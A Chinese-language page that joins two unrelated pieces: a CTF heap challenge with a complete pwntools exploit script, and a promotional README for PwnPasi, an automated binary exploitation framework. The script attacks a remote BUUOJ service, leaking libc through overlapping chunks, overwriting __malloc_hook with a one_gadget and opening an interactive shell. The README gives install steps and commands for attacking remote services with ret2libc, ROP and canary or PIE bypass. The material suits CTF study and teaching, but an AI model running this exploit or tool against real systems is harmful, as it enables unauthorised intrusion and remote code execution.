```
Ubuntu 16.04

初学c语言的小杏设计了一个信息管理系统，你能给小杏提点建议吗？
```



```python
from pwn import *
r = remote("node3.buuoj.cn", 29290)
#r = process("./domo/domo")
context(log_level = 'debug', arch = 'amd64', os = 'linux')
elf = ELF("./domo/domo")
libc = ELF('./libc/libc-2.23.so')
one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]
menu = "> "
def add(size1, content1):
	r.recvuntil(menu)
	r.sendline('1')
	r.recvuntil("size:\n")
	r.sendline(str(size1))
	r.recvuntil("content:\n")
	r.send(content1)
def delete(index):
	r.recvuntil(menu)
	r.sendline('2')
	r.recvuntil("index:\n")
	r.sendline(str(index))
def edit(index, content):
	r.recvuntil(menu)
	r.sendline('4')
	r.recvuntil("addr:\n")
	r.sendline(str(index))
	r.recvuntil("num:\n")
	r.send(content)
def show(index):
	r.recvuntil(menu)
	r.sendline('3')
	r.recvuntil("index:\n")
	r.sendline(str(index))
	
add(0xf0, 'chunk0')
add(0x60, 'chunk1')
add(0xf0, 'chunk2')
add(0x10, 'chunk3')
delete(1)
delete(0)
add(0x68, 'a'*0x60+p64(0x170))#0
delete(2)
add(0xf0, 'aa')#1
show(0)
malloc_hook = u64(r.recvuntil('\x7f').ljust(8, '\x00')) - 0x58 - 0x10
libc.address = malloc_hook - libc.sym['__malloc_hook']
success("malloc_hook:"+hex(malloc_hook))
one_gadget = libc.address + one_gadget_16[3]
add(0x60, 'aa')#2
add(0x60, 'aa')#4
delete(0)
delete(4)
delete(2)
add(0x60, p64(malloc_hook-0x23))#0
add(0x60, p64(malloc_hook-0x23))#2
add(0x60, p64(malloc_hook-0x23))#4
payload = 'a'*0x13 + p64(one_gadget)
add(0x60, payload)
r.recvuntil(menu)
r.sendline('2'*0x1001)
r.interactive()
```


----


# 🚀 PwnPasi

**专业自动化二进制漏洞利用框架**

**项目地址：****https://github.com/heimao-box/pwnpasi**

![[Pasted image 20251101215449.png]]

___

## 🎯 PwnPasi 是什么？

PwnPasi 是一个**尖端的自动化二进制漏洞利用框架**，专为 CTF 竞赛和安全研究设计。它将复杂的二进制漏洞利用过程转变为自动化、流水线式的操作。

### ✨ 核心特性

🔍**智能漏洞检测**

-   自动栈溢出检测与动态填充计算
-   格式化字符串漏洞识别与利用
-   二进制保护机制分析（RELRO、栈保护金丝雀、NX、PIE）
-   汇编代码分析，检测脆弱函数

⚡**高级利用技术**

-   **ret2system**：直接系统函数调用
-   **ret2libc**：通过泄露 libc 地址绕过 ASLR
-   **ROP 链构建**：自动化 gadget 发现与链式构建
-   **系统调用利用**：execve 系统调用链
-   **Shellcode 注入**：RWX 段利用
-   **栈保护金丝雀绕过**：通过格式化字符串泄露金丝雀
-   **PIE 绕过**：位置无关可执行文件规避技术

🏗️**多架构支持**

-   **x86 (32位)**：完整的 32 位利用链
-   **x86\_64 (64位)**：全面的 64 位利用支持
-   **自动检测**：智能架构识别

🌐**灵活部署模式**

-   **本地模式**：直接利用本地二进制文件
-   **远程模式**：攻击网络服务
-   **混合模式**：无缝从本地过渡到远程利用

___

## 🚀 快速开始

### 安装

```
<span leaf=""># 克隆仓库</span><br><span leaf="">git clone https://github.com/heimao-box/pwnpasi.git</span><br><span leaf="">cd pwnpasi</span><br><br><span leaf=""># 运行自动化安装脚本</span><br><span leaf="">python setup.py</span>
```

安装脚本将自动完成：

-   安装系统依赖（Kali/Debian）
-   配置 Python 包（pwntools, LibcSearcher, ropper）
-   设置环境
-   （可选）将 pwnpasi 添加到系统 PATH

### 基本使用

```
<span leaf=""># 分析本地二进制文件</span><br><span leaf="">python pwnpasi.py -l ./target_binary</span><br><br><span leaf=""># 远程利用</span><br><span leaf="">python pwnpasi.py -l ./binary -ip 192.168.1.100 -p 9999</span><br><br><span leaf=""># 自定义 libc 和填充长度</span><br><span leaf="">python pwnpasi.py -l ./binary -libc ./libc-2.19.so -f 112</span>
```

___

## 💡 使用示例

### 🎪 本地二进制分析

```
<span leaf=""># 全面本地分析</span><br><span leaf="">python pwnpasi.py -l ./vuln_binary</span>
```

### 🌍 远程服务利用

```
<span leaf=""># 攻击远程 CTF 服务</span><br><span leaf="">python pwnpasi.py -l ./local_binary -ip ctf.example.com -p 31337</span>
```

### 🔧 高级配置

```
<span leaf=""># 指定自定义 libc 和手动填充长度</span><br><span leaf="">python pwnpasi.py -l ./binary -libc /lib/x86_64-linux-gnu/libc.so.6 -f 88 -v</span>
```

___

## 📋 命令行选项

<table style="table-layout: fixed;border-collapse: collapse;border: 1px solid #d9d9d9;width: 750px;"><tbody><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(15, 17, 21);font-size: 16px;"><span leaf="">选项</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(15, 17, 21);font-size: 16px;"><span leaf="">描述</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;text-align: left;"><span style="color: rgb(15, 17, 21);font-size: 16px;"><span leaf="">示例</span></span></p></td></tr><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-l, --local</span></span></code></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(15, 17, 21);font-size: 16px;"><span leaf="">目标二进制文件（必需）</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-l ./vuln_app</span></span></code></p></td></tr><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-ip, --ip</span></span></code></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(15, 17, 21);font-size: 16px;"><span leaf="">远程目标 IP 地址</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-ip 192.168.1.100</span></span></code></p></td></tr><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-p, --port</span></span></code></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(15, 17, 21);font-size: 16px;"><span leaf="">远程目标端口</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-p 9999</span></span></code></p></td></tr><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-libc, --libc</span></span></code></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(15, 17, 21);font-size: 16px;"><span leaf="">自定义 libc 文件路径</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-libc ./libc-2.27.so</span></span></code></p></td></tr><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-f, --fill</span></span></code></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(15, 17, 21);font-size: 16px;"><span leaf="">手动设置溢出填充大小</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-f 112</span></span></code></p></td></tr><tr style="height: 33px;"><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-v, --verbose</span></span></code></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><span style="color: rgb(15, 17, 21);font-size: 16px;"><span leaf="">启用详细输出</span></span></p></td><td data-colwidth="250" width="250" style="border: 1px solid #d9d9d9;"><p style="margin: 0;padding: 0;min-height: 24px;"><code style="font-family: SFMono-Regular, Consolas, Liberation Mono, Menlo, Courier, monospace;background-color: rgba(0, 0, 0, 0.06);border: 1px solid rgba(0, 0, 0, 0.08);border-radius: 2px;padding: 0px 2px;"><span style="color: rgb(15, 17, 21);background-color: rgb(235, 238, 242);font-size: 16px;"><span leaf="">-v</span></span></code></p></td></tr></tbody></table>

![[pwnpasi命令.png]]

___

## 🛠️ 技术栈

### 核心依赖

-   **pwntools**\- 终极 CTF 框架
-   **LibcSearcher**\- Libc 数据库和版本检测
-   **ropper**\- 高级 ROP gadget 发现
-   **checksec**\- 二进制安全特性分析

### 系统工具集成

-   **objdump**\- 汇编分析与反汇编
-   **strings**\- 字符串提取与分析
-   **ldd**\- 动态库依赖映射
-   **gdb**\- 高级调试功能

___

## 🎨 输出预览

![[Pasted image 20251101215524.png]]
![[Pasted image 20251101215533.png]]
![[Pasted image 20251101215543.png]]
![[Pasted image 20251101215552.png]]


___

## 🏆 为什么选择 PwnPasi？

### 🎯**精准与自动化**

无需手动搜索 gadget 或计算地址。PwnPasi 以手术般的精度自动化整个漏洞利用流程。

### 🚀**速度与效率**

从漏洞检测到获取 shell，只需数秒而非数小时。完美应对时间紧迫的 CTF 场景。

### 🧠**智能与适应性**

智能回退机制确保在不同二进制配置和保护方案下的最高成功率。

___

## 🤝 贡献指南

我们欢迎各种形式的贡献！包括：

-   🐛 错误报告与修复
-   ✨ 新的利用技术
-   📚 文档改进
-   🔧 性能优化

___

## ⚠️ 免责声明

PwnPasi 仅用于**教育目的**和**授权的安全测试**。用户需确保遵守相关法律法规。开发者对工具的误用不承担任何责任。